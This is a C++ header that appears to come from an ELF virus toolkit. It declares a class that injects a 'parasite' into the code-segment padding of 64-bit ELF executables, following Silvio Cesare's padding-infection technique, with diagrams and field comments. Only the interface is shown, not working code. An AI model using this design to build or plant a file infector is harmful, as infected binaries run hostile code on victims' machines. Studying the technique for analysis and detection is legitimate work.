#pragma once
#include <elf.h>
#include "common/mmap.hh"

namespace vt::infector {
// This algorithm injects a parasite into an 64 bit elf's code segment padding,
// based on the paper publish by Silvio Cesare:
// https://vxug.fakedoma.in/archive/VxHeaven/lib/vsc01.html
//
//  host elf file structure       infected elf file structure
//  -------------------           -----------------------
//  elf_hdr                       elf_hdr
//  phdrs                         phdrs
//  executable_sections           executable_sections
//  padding                       padding             <- virus inserted here
//  non-exec sections             non-exec sections
//  shdrs                         shdrs
//
//
// Because the sections in file has the same padding, inserting virus doesn't
// change file size.
//
//  infected elf segments
//  -------------------
//  LOAD RX
//    Ehdr                      --
//    phdrs                      |     executable segment
//    interp                     |
//    PADDING    <- virus here  --
//  LOAD RW
//    .data                     --
//    ...                        |     ajacent non-executable segment
//    ...                       --

class PaddingInfect {
 public:
  size_t injected_host_size() { return host_size_; }

  bool analyze(const common::Mmap<PROT_READ>& host_mapping,
               const common::Mmap<PROT_READ>& parasite_mapping);

  bool infect(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
              common::Mmap<PROT_READ> parasite_mapping);

 private:
  size_t host_size_ = 0;

  // the code cave size that is available for insertion.
  size_t padding_size_;

  // the last byte offset of code setment in file.
  Elf64_Off code_segment_last_byte_offset_;

  // the offset in file that the first byte of parasite code starts.
  Elf64_Off parasite_file_offset_;

  // the fixed virtual memory address the parasite code is loaded to. Only
  // valid for EXEC elfs.
  Elf64_Addr parasite_load_address_;

  // the program header entry corresponding to the code segment that will be
  // patched.
  size_t patch_phdr_entry_idx_;

  // the parasite size with extra alignment padding accounted for.
  size_t parasite_size_and_padding_;
};

}  // namespace vt::infector